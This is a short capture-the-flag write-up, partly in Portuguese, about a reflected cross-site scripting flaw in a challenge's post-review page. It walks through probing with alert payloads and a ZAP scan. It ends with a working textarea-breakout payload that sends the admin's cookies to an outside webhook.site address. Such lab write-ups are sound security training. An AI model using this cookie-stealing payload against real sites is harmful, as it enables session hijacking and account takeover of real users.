# Challenge `Go_on_and_censor_my_posts` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Cross Site Scripting (Reflected)
- Where: Where is the vulnerability present
  - No endopoint `/post_under_admin_revision/4c4b87313db00a775d6f27023d61dbbf188171ca83562cb936ab623219749712`
- Impact: What results of exploiting this vulnerability
  - Permite escrever um "script" que envie as cookies do admin para um site que eu controlo
## Steps to reproduce

1. Comecei por testar se a página era vulnerável a simples scripts como `<script>alert(1)</script>` no campo search mas nada aconteceu, não abriu um popup nem gerou erro. 
2. Tentei executar alguns scripts no campo `Title`, sem sucesso, no entanto após ter preenchido os campos `Title` e `content` fui para esta diretoria `/posts_under_review/4c4b87313db00a775d6f27023d61dbbf188171ca83562cb936ab623219749712`
3. No campo `Content` executei alguns scripts, todos sem sucesso. Abri o zaproxy e fiz um scan a possíveis vulnerabilidades
4. Apareceu um ataque ao endpoint onde eu estava (do ponto 2) `</textarea><script>alert(1);</script><textarea>` 
5. Pelo ponto acima percebi que bastava escrever um script igual ao do exercício anterior `</textarea><script>document.location="https://webhook.site/961991c1-1ddd-4e42-b026-09d320cd060d?cookie"+document.cookie;</script><textarea>`
